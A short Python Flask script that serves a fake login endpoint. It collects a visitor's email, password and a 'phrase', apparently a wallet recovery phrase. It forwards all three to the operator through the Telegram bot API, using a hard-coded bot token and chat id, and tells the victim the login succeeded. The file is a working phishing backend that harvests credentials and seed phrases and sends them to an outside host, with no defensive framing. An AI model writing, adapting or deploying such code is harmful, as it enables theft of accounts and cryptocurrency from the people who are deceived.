from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    phrase = request.form['phrase']
    send_to_telegram(email, password, phrase)
    return "Logged In Successfully"

def send_to_telegram(email, password, phrase):
    bot_token = '6779292503:AAFXp2OkpoKiRjknI9plhvXs1pN-WAuZPIA'
    chat_id = '6985972252'
    text = f"Login Attempt - email: {email}, Password: {password}, phrase: {phrase}" 
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': text}
    
    response = requests.post(url, data=data)
    print(response.text)  # For debug purposes

if name == '__main__':
    app.run(ssl_context='adhoc')